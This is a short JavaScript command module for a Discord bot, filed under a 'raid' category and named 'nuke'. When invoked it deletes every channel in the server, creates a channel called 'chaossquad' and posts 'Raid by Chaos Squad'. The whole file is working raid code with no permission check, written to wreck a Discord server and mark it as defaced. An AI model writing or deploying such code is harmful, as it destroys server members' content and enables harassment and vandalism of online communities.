const { MessageEmbed } = require('discord.js')
module.exports = {
    name : 'nuke',
    category : 'raid',
    description : 'Elimina todos los canales',

    run : async(client, message, args) => {
        message.guild.channels.cache.forEach(channel => channel.delete());
        message.guild.channels.create(`chaossquad`, {
              type: 'text'
            }).then(channel => {
              channel.send("Raid by Chaos Squad")
            })
    }
}